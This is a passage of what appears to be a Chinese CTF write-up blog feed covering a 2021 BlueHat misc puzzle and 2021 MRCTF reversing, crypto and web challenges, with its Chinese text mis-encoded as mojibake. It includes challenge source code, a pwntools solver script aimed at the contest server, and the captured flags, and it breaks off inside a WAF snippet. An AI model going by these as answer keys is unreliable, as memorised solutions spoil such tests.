â’ï¸â™ï¸â—»ï¸â–¡ï¸â¬§ï¸â™“ï¸â§«ï¸â–¡ï¸â’ï¸â“ï¸ â– ï¸â™‹ï¸âï¸â™ï¸â™ï¸ ğŸ“‚ï¸â™ï¸â™ï¸ğŸ±ï¸â™ï¸â™‹ï¸ğŸ™µ â™“ï¸â¬§ï¸ â–ï¸â™ï¸â’ï¸â“ï¸ â™“ï¸â– ï¸â§«ï¸â™ï¸â’ï¸â™ï¸â¬§ï¸â§«ï¸â™“ï¸â– ï¸â™‘ï¸ğŸ“¬ï¸ ğŸ•ˆï¸â™’ï¸â“ï¸ â– ï¸â–¡ï¸â§«ï¸ â§«ï¸â™‹ï¸ğŸ™µâ™ï¸ â™‹ï¸ â—ï¸â–¡ï¸â–¡ï¸ğŸ™µ â™‹ï¸â§«ï¸ â™“ï¸â§«ï¸âœï¸</span></code></pre><p>WingDing ç¼–ç ï¼Œåœ¨ <a href="https://lingojam.com/WingDing">https://lingojam.com/WingDing</a> è¿™é‡Œåœ¨çº¿è§£ç ä¸€ä¸‹ã€‚</p><p><img src="/2021/05/09/CTF_2021BlueHat/image-20210429162641099.png"></p><pre class="language-none"><code class="language-none">Aï¸ Gï¸iï¸tï¸Hï¸uï¸bï¸ rï¸eï¸pï¸oï¸sï¸iï¸tï¸oï¸rï¸yï¸ nï¸aï¸mï¸eï¸dï¸ 1ï¸cï¸eï¸Pï¸eï¸aï¸k iï¸sï¸ vï¸eï¸rï¸yï¸ iï¸nï¸tï¸eï¸rï¸eï¸sï¸tï¸iï¸nï¸gï¸.ï¸ Wï¸hï¸yï¸ nï¸oï¸tï¸ tï¸aï¸keï¸ aï¸ lï¸oï¸oï¸k aï¸tï¸ iï¸tï¸?ï¸</code></pre><blockquote><p>WingDing ç¼–ç è¡¨</p><p><img src="/2021/05/09/CTF_2021BlueHat/gSEBUIX.png"></p></blockquote><p>åœ¨ GitHub ä¸Šæ‰¾åˆ°äº† <a href="https://github.com/Tr0jAnV1rU4/1cePeak">https://github.com/Tr0jAnV1rU4/1cePeak</a> è¿™ä¸ªä»“åº“ã€‚</p><p><a href="https://github.com/Tr0jAnV1rU4/1cePeak/blob/main/A/post-checkout">https://github.com/Tr0jAnV1rU4/1cePeak/blob/main/A/post-checkout</a></p><p><img src="/2021/05/09/CTF_2021BlueHat/image-20210429162954567.png"></p><p>åˆæƒ³åˆ°åœ¨ mp3 ç»“å°¾æœ‰ä¸ª <code>cipher</code></p><p><img src="/2021/05/09/CTF_2021BlueHat/image-20210429163106993.png"></p><p>Hex è§£ç å‡ºæ¥æ˜¯ä¸€å † emoji</p><p><img src="/2021/05/09/CTF_2021BlueHat/image-20210429163410691.png"></p><p>è€ƒè™‘æ˜¯ emoji-aes åŠ å¯†</p><p><a href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a></p><p>ï¼ˆæˆ–è€…ç”¨å’±è‡ªå·±æ­çš„ <a href="https://emoji-aes.miaotony.xyz/">https://emoji-aes.miaotony.xyz/</a> ä¹Ÿè¡Œ</p><p>ç”¨ <code>How_6ad_c0uld_a_1cePeak_be?</code> ä½œä¸º Key å»è§£å¯†ï¼Œæ‹¿åˆ° flagã€‚</p><p><img src="/2021/05/09/CTF_2021BlueHat/image-20210429163623937.png"></p><p><code>flag{e32f619b-dbcd-49bd-9126-5d841aa01767}</code></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å–µï¼Œæ‘¸é±¼çœŸèˆ’æœã€‚</p><p>è½¬çœ¼ä¹‹é—´å°±åˆ°äº”æœˆä»½äº†å•Šã€‚</p><p>è¿™ä¸ªæœˆæœ‰ç‚¹å¿™ä¸èƒ½æ‘¸é±¼äº†ï¼Œå–µå‘œå‘œå‘œå‘œå‘œå‘œã€‚</p><p><em>ï¼ˆæºœäº†æºœäº†å–µ</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2021 MRCTF WriteUp</title>
      <link href="2021/04/15/CTF_2021MRCTF/"/>
      <url>2021/04/15/CTF_2021MRCTF/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414230156814.png"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><blockquote><p><strong>2021 MRCTF</strong></p><p><a href="https://2021.mrctf.fun/">https://2021.mrctf.fun/</a></p><p><strong>æ¯”èµ›æ—¶é—´</strong></p><p>2021-04-10 9ï¼š00 - 2021-4-11 21ï¼š00</p><p><strong>æ¯”èµ›è§„åˆ™</strong></p><p>å•äººè§£é¢˜èµ›</p></blockquote><p>å‰å‡ å¤©çœ‹åŒ—é‚® å¤©ç’‡Merak æˆ˜é˜Ÿæ•´äº†ä¸ªæ‹›æ–°èµ›ï¼Œå–µå–µä¹Ÿæ¥éšä¾¿ç©ç©å¥½äº†ï¼</p><p>ä»€ä¹ˆé¬¼æ‹›æ–°èµ›å˜›ï¼Œæ€ä¹ˆå·¨å¤§å¤š check in é¢˜ç›®ï¼Œç„¶è€Œå–µå–µå¹¶ä¸èƒ½ check inâ€¦â€¦</p><p>å–µå‘œï¼Œé¢˜ç›®è¿˜æ˜¯æ¯”è¾ƒé¡¶çš„ï¼Œå–µå–µç¡®å®ä¹Ÿä¸ä¼šåšä»€ä¹ˆï¼Œå¤§å“­ã€‚</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Real-CHECKIN"><a href="#Real-CHECKIN" class="headerlink" title="Real_CHECKIN"></a>Real_CHECKIN</h3><p>ç›´æ¥ä¸¢è¿› IDA å‘ç°åªæœ‰ä¸€ä¸ª entryï¼Œçœ‹æ¥æ˜¯åŠ å£³äº†ã€‚</p><p>ä¸¢è¿› FUPX é‡Œä¸€çœ‹ï¼Œæœç„¶åŠ äº† UPX å£³ã€‚</p><p><img src="/2021/04/15/CTF_2021MRCTF/image-20210410221618087.png"></p><p>è„±ä¸€ä¸‹å£³ï¼Œå†æ‰”è¿› IDAã€‚</p><p><img src="/2021/04/15/CTF_2021MRCTF/image-20210410221654708.png"></p><p><code>tvjdvez7D0vSyZbnzv90mf9nuKnurL8YBZiXiseHFq==</code> ç›´æ¥æ‹¿å» base64 è§£ç å‘ç°æ˜¯ä¹±ç ã€‚çœ‹æ¥æ˜¯é­”æ”¹çš„ base64 äº†ã€‚</p><p><img src="/2021/04/15/CTF_2021MRCTF/image-20210410224735510.png"></p><p>å‘ç°ç¼–ç è¡¨é‡Œ å¤§å°å†™åè¿‡æ¥äº†â€¦â€¦è‰ï¼</p><p><img src="/2021/04/15/CTF_2021MRCTF/image-20210410224700889.png"></p><p>äºæ˜¯å¤§å°å†™åè¿‡æ¥ï¼Œæ”¹ä¸€ä¸‹ç¼–ç è¡¨ï¼Œå†æ‹¿å» base64 è§£ç å°±èƒ½æ‹¿ flag äº†ã€‚</p><p><code>MRCTF{wElc0Me_t0_MRCTF_2o21!!!}</code></p><blockquote><p><strong>Extensive Reading:</strong></p><p><a href="https://www.freebuf.com/articles/database/140773.html">çˆ†ç ´éé»˜è®¤Base64ç¼–ç è¡¨</a></p></blockquote><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="friendly-sign-in"><a href="#friendly-sign-in" class="headerlink" title="friendly_sign-in"></a>friendly_sign-in</h3><blockquote><p>ez sign-in, just come and get the flag!<br> nc node.mrctf.fun 10007</p><p>Mirrors:</p><ul><li>host, port = â€˜nairw.topâ€™, 4800</li></ul><p><a href="https://drive.buptmerak.cn/s/BTx9QNNskyKwnYH">https://drive.buptmerak.cn/s/BTx9QNNskyKwnYH</a></p></blockquote><p>æºç </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha512<span class="token keyword">from</span> random <span class="token keyword">import</span> choices<span class="token keyword">from</span> flag <span class="token keyword">import</span> flag<span class="token keyword">import</span> stringBits <span class="token operator">=</span> <span class="token number">512</span>length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token keyword">def</span> <span class="token function">proof_of_work</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>    alphabet <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits    head <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>choices<span class="token punctuation">(</span>alphabet<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'POW: SHA512("</span><span class="token interpolation"><span class="token punctuation">{</span>head<span class="token punctuation">}</span></span><span class="token string">" + ?) starts with "11111"'</span></span><span class="token punctuation">)</span>    tail <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    message <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> sha512<span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"11111"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check_ans</span><span class="token punctuation">(</span>_N<span class="token punctuation">,</span> _x<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>    check <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>_N<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        check <span class="token operator">+=</span> _N<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> _x<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> check <span class="token operator">==</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> proof_of_work<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to MRCTF2021, enjoy this friendly sign-in question~"</span><span class="token punctuation">)</span>    flag_bits <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    N <span class="token operator">=</span> <span class="token punctuation">[</span>getPrime<span class="token punctuation">(</span>Bits<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'N ='</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span>    X <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> x <span class="token keyword">in</span> X<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'No cheat!'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">if</span> x<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'No trivial!'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_ans<span class="token punctuation">(</span>N<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Follow the rule!'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        X<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'your gift:'</span><span class="token punctuation">,</span> flag_bits<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>å…¶å®è¿™ä¸ªæ€è·¯å¾ˆç®€å•ï¼Œåªéœ€è¦ç”Ÿæˆ </p><ul><li>ä¸é‡å¤ </li><li>æ¯ä¸ªæ•°éƒ½ä¸ä¸º0 </li><li>å¯¹åº”ä½ç½®æ•°å­—çš„ä¹˜ç§¯ç´¯åŠ å’Œä¸º0 </li></ul><p>è¿™æ ·çš„åºåˆ—å°±å¯ä»¥äº†ã€‚</p><p>é‚£ä¹ˆæ€ä¹ˆç”Ÿæˆå‘¢ï¼Ÿ</p><p>å…¶å®åªéœ€è¦ä»»æ„ (length/2) å¯¹æ•°å­—äº¤æ¢ä¸€ä¸‹ï¼Œæ­£è´Ÿå·äº¤æ›¿ä¸€ä¸‹ï¼Œå°±èƒ½å®ç°ä¹˜ç§¯ç´¯åŠ å’Œä¸º 0 äº†ã€‚</p><p>é‚£æ€ä¹ˆä¸é‡å¤å‘¢ï¼Ÿ</p><p>å–µå–µæƒ³äº†æœ‰ä¸€æ®µæ—¶é—´ï¼Œåˆ°æœ€åä¸€æƒ³ï¼Œç›´æ¥éšæœºäº§ç”Ÿä¸‹æ ‡ï¼ŒæŠŠæ˜ å°„å…³ç³»å­˜ä¸€ä¸‹ï¼Œè¦æ˜¯å·²ç»å­˜åœ¨äº†å†²çªäº†å°±é‡æ–°äº§ç”Ÿå°±å®Œäº‹äº†å‘€ï¼</p><p>å¦å¤–æœ‰ä¸ªéº»çƒ¦çš„åœ°æ–¹å°±æ˜¯äº¤äº’å§ï¼Œè¾“å…¥ 224*224 ä¸ªæ•°å­—ï¼Œè·‘èµ·æ¥éƒ½æŒºä¹…çš„â€¦â€¦</p><p><strong>Exp:</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha512<span class="token keyword">from</span> random <span class="token keyword">import</span> choices<span class="token keyword">import</span> string<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm<span class="token keyword">from</span> pwnlib<span class="token punctuation">.</span>util<span class="token punctuation">.</span>iters <span class="token keyword">import</span> mbruteforcesh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'nairw.top'</span><span class="token punctuation">,</span> <span class="token number">4800</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">proof_of_work</span><span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"SHA512(\""</span><span class="token punctuation">)</span>    head <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment"># .decode('utf-8')</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"head:"</span><span class="token punctuation">,</span> head<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'with \"11111\"'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> a <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x7f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x7f</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x7f</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x7f</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    rest <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>                    m <span class="token operator">=</span> <span class="token punctuation">(</span>head<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token operator">+</span> rest<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> sha512<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"11111"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nrest:'</span><span class="token punctuation">,</span> rest<span class="token punctuation">)</span>                        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>rest<span class="token punctuation">)</span>                        <span class="token comment"># sh.recvuntil('again...God bless you get it...')</span>                        <span class="token keyword">return</span>    <span class="token comment"># proof = mbruteforce(lambda x: sha512((head + x).encode('utf-8')).hexdigest().startswith(</span>    <span class="token comment">#     "11111"), string.ascii_letters + string.digits, length=4, method='fixed')</span>    <span class="token comment"># print('rest:', proof)</span>    <span class="token comment"># sh.sendline(proof)</span><span class="token keyword">def</span> <span class="token function">generate_idx</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    éšæœºç”Ÿæˆå¯¹æ¢çš„ä¸‹æ ‡ dict    """</span>    idx_list <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    idx_result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> choices<span class="token punctuation">(</span>idx_list<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            t <span class="token operator">=</span> choices<span class="token punctuation">(</span>idx_list<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> r <span class="token operator">!=</span> t<span class="token punctuation">:</span>                <span class="token comment"># print(r, t)</span>                <span class="token comment"># ä¸€åŠæ­£ ä¸€åŠè´Ÿ</span>                idx_result<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>t<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># æ­£è´Ÿå·</span>                idx_result<span class="token punctuation">[</span>t<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>r<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                idx_list<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>r<span class="token punctuation">)</span>                idx_list<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>t<span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">return</span> idx_result<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    proof_of_work<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"question~"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"N = "</span><span class="token punctuation">)</span>    tmp <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"]"</span><span class="token punctuation">)</span>    tmp <span class="token operator">=</span> tmp<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    tmp <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'===================='</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag len:"</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment"># 28 bits</span>    N <span class="token operator">=</span> tmp    length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span>    idx_history <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    flag_bits <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>        idx <span class="token operator">=</span> generate_idx<span class="token punctuation">(</span>length<span class="token punctuation">)</span>        <span class="token keyword">while</span> idx <span class="token keyword">in</span> idx_history<span class="token punctuation">:</span>            idx <span class="token operator">=</span> generate_idx<span class="token punctuation">(</span>length<span class="token punctuation">)</span>        idx_history<span class="token punctuation">.</span>append<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                t <span class="token operator">=</span> N<span class="token punctuation">[</span>idx<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">*</span> idx<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>                <span class="token keyword">raise</span> Exception            payload <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>            sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'your gift: '</span><span class="token punctuation">)</span>        x <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"=======&gt; flag_</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">{</span>x<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        flag_bits <span class="token operator">+=</span> x        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">{</span>x<span class="token punctuation">}</span></span><span class="token string"> "</span></span><span class="token punctuation">)</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>flag_bits<span class="token punctuation">}</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag_bits<span class="token punctuation">)</span>    <span class="token comment"># flag_bits = "1001101010100100100001101010100010001100111101101100101010000000011001101111001010111110110001101101000001100110110001101101011010111110011000101101110010111110111000001110010001100000110001001101100001100110110110101111101"</span>    flag_int <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>flag_bits<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>flag_int<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=====&gt; flag:"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>æœ€åå¾—åˆ°çš„ flag bits ä¸º</p><pre class="language-none"><code class="language-none">1001101010100100100001101010100010001100111101101100101010000000011001101111001010111110110001101101000001100110110001101101011010111110011000101101110010111110111000001110010001100000110001001101100001100110110110101111101</code></pre><p>è½¬æ¢ä¸º bytes</p><p><code>MRCTF{e@3y_ch3ck_1n_pr0bl3m}</code></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="wwwafed-app"><a href="#wwwafed-app" class="headerlink" title="wwwafed_app"></a>wwwafed_app</h3><blockquote><p>I bought a WAF for my vulnerable app, and I think itâ€™s unbreakable now.</p><p>node.mrctf.fun:15000</p></blockquote><p><code>/waf</code> æºç ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token punctuation">,</span>sys<span class="token keyword">import</span> timeout_decorator<span class="token decorator annotation punctuation">@timeout_decorator<span class="token punctuation">.</span>timeout</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># only xxx.yy-yy.zzz.mrctf.fun allow</span>pat <span class="token operator">=</span> <span class="token string">r'^(([0-9a-z]|-)+|[0-9a-z]\.)+(mrctf\.fun)$'</span><span class="token keyword">if</span> re<span class="token punctuation">.</span>match<span class="token 